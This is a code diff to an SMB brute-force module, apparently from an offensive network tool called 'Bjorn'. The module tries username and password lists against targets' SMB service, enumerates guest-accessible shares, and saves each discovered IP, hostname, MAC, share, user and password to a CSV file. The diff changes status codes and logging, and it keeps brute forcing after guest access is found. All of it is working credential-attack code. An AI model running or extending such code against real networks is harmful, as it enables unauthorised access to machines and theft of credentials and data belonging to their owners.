@@ -26,7 +26,7 @@ from timeout_utils import (
 )
 
 # Configure the logger
-logger = Logger(name="smb_connector.py", level=logging.DEBUG)
+logger = Logger(name="smb_connector.py", level=logging.INFO)
 
 # Define the necessary global variables
 b_class = "SMBBruteforce"
@@ -47,11 +47,11 @@ class SMBBruteforce:
         self.smb_connector = SMBConnector(shared_data)
         logger.info("SMBConnector initialized.")
 
-    def bruteforce_smb(self, ip, port):
+    def bruteforce_smb(self, ip, port, mac_address='', hostname=''):
         """
         Run the SMB brute force attack on the given IP and port.
         """
-        return self.smb_connector.run_bruteforce(ip, port)
+        return self.smb_connector.run_bruteforce(ip, port, mac_address, hostname)
 
     def execute(self, ip, port, row, status_key):
         """
@@ -60,12 +60,15 @@ class SMBBruteforce:
         start_time = time.time()
         logger.lifecycle_start("SMBBruteforce", ip, port)
         self.shared_data.bjornorch_status = "SMBBruteforce"
+        # Extract hostname and MAC from the row passed by orchestrator
+        hostname = row.get('Hostnames', '')
+        mac_address = row.get('MAC Address', '')
         try:
-            success, results = self.bruteforce_smb(ip, port)
-            status = 'success' if success else 'failed'
+            success, results = self.bruteforce_smb(ip, port, mac_address, hostname)
+            status = 'success' if success else 'no_creds_found'
         except Exception as e:
             logger.error(f"SMB bruteforce error for {ip}: {e}")
-            status = 'failed'
+            status = 'error'
         finally:
             duration = time.time() - start_time
             logger.lifecycle_end("SMBBruteforce", status, duration, ip)
@@ -86,7 +89,7 @@ class SMBConnector:
         self.smbfile = shared_data.smbfile
         # If the file doesn't exist, it will be created
         if not os.path.exists(self.smbfile):
-            logger.info(f"File {self.smbfile} does not exist. Creating...")
+            logger.debug(f"Creating {self.smbfile}")
             with open(self.smbfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,Share,User,Password,Port\n")
         self.results = []  # List to store results temporarily
@@ -94,6 +97,7 @@ class SMBConnector:
         self.progress_lock = threading.Lock()
         self.progress_count = 0
         self.progress_total = 0
+        self.guest_shares = set()  # Shares accessible via guest (to skip during brute force)
 
     def _load_csv_filtered(self, filepath, port_filter):
         """Load CSV and filter rows containing the specified port."""
@@ -137,21 +141,23 @@ class SMBConnector:
     def _smb_connect_inner(self, adresse_ip, user, password):
         """
         Inner connection logic for SMB - wrapped by smb_connect with timeout.
+        Skips shares already found via guest access.
         """
         conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
         try:
             conn.connect(adresse_ip, 445, timeout=30)
             shares = conn.listShares(timeout=30)
             accessible_shares = []
+            # Get guest shares for this IP (set during run_bruteforce)
+            guest_shares = getattr(self, 'guest_shares', set())
             for share in shares:
                 if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                     continue
+                # Skip shares already accessible via guest
+                if share.name in guest_shares:
+                    continue
                 try:
                     conn.listPath(share.name, '/', timeout=15)
-                    # Check if this share allows guest access - skip if it does
-                    if self._check_guest_access(adresse_ip, share.name):
-                        logger.debug(f"Share {share.name} on {adresse_ip} allows guest - skipping")
-                        continue
                     accessible_shares.append(share.name)
                     logger.debug(f"Access to {share.name} on {adresse_ip} with '{user}'")
                 except Exception as e:
@@ -287,7 +293,7 @@ class SMBConnector:
                     for share in shares:
                         if share not in IGNORED_SHARES:
                             new_results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                            logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}")
+                            logger.success(f"SMB credentials: {adresse_ip} | {user} | {share}")
 
                     if new_results:
                         with self.lock:
@@ -325,7 +331,7 @@ class SMBConnector:
                     shares = conn.listShares(timeout=15)
                     conn.close()
                     if shares:
-                        logger.info(f"Server {adresse_ip} allows guest/anonymous access - skipping brute force")
+                        logger.info(f"Server {adresse_ip} allows guest/anonymous access")
                         return True
                 except:
                     pass
@@ -337,46 +343,46 @@ class SMBConnector:
             logger.debug(f"Guest access check failed for {adresse_ip}: {e}")
         return False
 
-    def run_bruteforce(self, adresse_ip, port):
-        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
+    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
+        # Use provided mac_address and hostname from orchestrator (more reliable)
+        # Fallback to lookup if not provided
+        if not mac_address or not hostname:
+            self.load_scan_file()
+            for row in self.scan:
+                if row.get('IPs') == adresse_ip:
+                    if not mac_address:
+                        mac_address = row.get('MAC Address', '')
+                    if not hostname:
+                        hostname = row.get('Hostnames', '')
+                    break
 
-        # Find the row for this IP
-        mac_address = ""
-        hostname = ""
-        for row in self.scan:
-            if row.get('IPs') == adresse_ip:
-                mac_address = row.get('MAC Address', '')
-                hostname = row.get('Hostnames', '')
-                break
-
-        # Check for guest access FIRST - if allowed, skip brute force entirely
+        # Check for guest access first and enumerate guest shares
+        # We'll continue brute force but only log NEW shares not accessible via guest
+        self.guest_shares = set()  # Track guest-accessible shares for this IP
         if self._check_guest_access_server(adresse_ip):
-            # Enumerate shares with guest access and log them
-            logger.info(f"Enumerating shares on {adresse_ip} with guest access")
+            logger.info(f"Enumerating guest shares on {adresse_ip}")
             try:
                 conn = SMBConnection("guest", "", "Bjorn", "Target", use_ntlm_v2=True)
-                if conn.connect(adresse_ip, 445, timeout=15):
+                guest_connected = conn.connect(adresse_ip, 445, timeout=15)
+                if guest_connected:
                     shares = conn.listShares(timeout=15)
                     for share in shares:
                         if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                             continue
                         try:
                             conn.listPath(share.name, '/', timeout=10)
+                            self.guest_shares.add(share.name)
                             with self.lock:
                                 self.results.append([mac_address, adresse_ip, hostname, share.name, "guest", "", port])
-                            logger.info(f"Guest access to share '{share.name}' on {adresse_ip}")
                         except:
                             pass
                     conn.close()
+                    if self.guest_shares:
+                        logger.info(f"Guest access on {adresse_ip}: {len(self.guest_shares)} shares")
+                        self.save_results()
+                        self.removeduplicates()
             except Exception as e:
                 logger.debug(f"Error enumerating guest shares on {adresse_ip}: {e}")
-                # Still mark as guest access even if enumeration fails
-                with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, "GUEST_ACCESS", "guest", "", port])
-
-            self.save_results()
-            self.removeduplicates()
-            return True, self.results
 
         total_tasks = len(self.users) * len(self.passwords)
         self.progress_total = total_tasks
@@ -428,8 +434,28 @@ class SMBConnector:
         # If no success with direct SMB connection (pysmb/SMB1), try smb2-share-enum (SMB2/3)
         if not success_flag[0] and not self.shared_data.orchestrator_should_exit:
             logger.info(f"Trying smb2-share-enum (SMB2/3) for {adresse_ip}")
+
+            # First check for guest access with garbage credentials
+            import uuid
+            garbage_user = f"guestcheck_{uuid.uuid4().hex[:8]}"
+            garbage_pass = uuid.uuid4().hex
+            guest_shares = set(self.smb2_share_enum(adresse_ip, garbage_user, garbage_pass) or [])
+
+            # Log guest shares
+            if guest_shares:
+                logger.info(f"SMB2/3 guest access on {adresse_ip}: {len(guest_shares)} shares")
+                with self.lock:
+                    for share in guest_shares:
+                        if share not in IGNORED_SHARES:
+                            self.results.append([mac_address, adresse_ip, hostname, share, "guest", "", port])
+                    success_flag[0] = True
+                self.save_results()
+                self.removeduplicates()
+
+            # Continue brute force to find shares NOT accessible via guest
             smb2_attempt_count = 0
             smb2_total = len(self.users) * len(self.passwords)
+            found_shares = set(guest_shares)  # Start with guest shares to avoid duplicates
             for user in self.users:
                 if self.shared_data.orchestrator_should_exit:
                     break
@@ -437,21 +463,22 @@ class SMBConnector:
                     if self.shared_data.orchestrator_should_exit:
                         break
                     smb2_attempt_count += 1
-                    # Log progress less frequently to reduce log spam
                     if smb2_attempt_count % 100 == 0:
                         logger.info(f"SMB2/3 brute force: {smb2_attempt_count}/{smb2_total}")
                     shares = self.smb2_share_enum(adresse_ip, user, password)
                     if shares:
-                        with self.lock:
-                            for share in shares:
-                                if share not in IGNORED_SHARES:
+                        new_shares = [s for s in shares if s not in IGNORED_SHARES and s not in found_shares]
+                        if new_shares:
+                            with self.lock:
+                                for share in new_shares:
+                                    found_shares.add(share)
                                     self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}")
-                                    self.save_results()
-                                    self.removeduplicates()
+                                    logger.success(f"SMB credentials: {adresse_ip} | {user} | {share}")
                                     success_flag[0] = True
+                                self.save_results()
+                                self.removeduplicates()
                     if self.shared_data.timewait_smb > 0:
-                        time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
+                        time.sleep(self.shared_data.timewait_smb)
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
